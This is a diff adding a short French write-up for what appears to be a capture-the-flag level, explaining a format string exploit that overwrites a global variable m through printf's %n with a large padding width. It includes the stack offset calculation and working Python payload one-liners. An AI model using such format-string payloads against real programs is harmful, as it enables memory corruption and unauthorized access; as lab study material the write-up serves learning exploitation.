@@ -1,0 +1,36 @@
+Ce niveau ressemble beaucoup au niveau précédent cependant l'appel de la fonction printf se fait par l'appel de la fonction p.
+
+On essaye donc la même méthoe avec la nouvelle adresse de m
+
+adresse de m(littleindian) = \x10\x98\x04\x08
+
+    python -c 'print "\x10\x98\x04\x08" + "A" * 4 + "%4$n"'
+
+Mais cela ne fonctionne pas car notre buffer ne peux contenir que 512 caractère puisque c'est la limite imposé par 
+l'argument 1 de fgets.
+
+Il faut donc trouver un moyen de forcer la taille de la string.
+
+Avec le printf on peut utiliser un attribut de remplissage et c'est ce que nous allons utiliser pour que la longueur du buffer
+soit de la taille voulue.
+
+Ce qui nous donne 
+
+    Il faut mettre l'adresse de m sur la stack ce qui nous prendra 4 octets dans le buffer.
+    (16930116 - 4) = 16930112
+
+    %16930112d pour avoir une taille de 16930112octets.
+
+        536 - 520 = 16
+    +   push ebp = 4
+    +   sauvegarde eip = 4
+    +   24 octets allocations fonction p
+    --------------------------------------
+        48 octets 
+
+    Nous devons trouver le nombre d'argument correspondant à cette position : 
+        48 / 4 = 12
+    
+    Ce qui nous donne une position au 12eme argument.
+
+    python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'
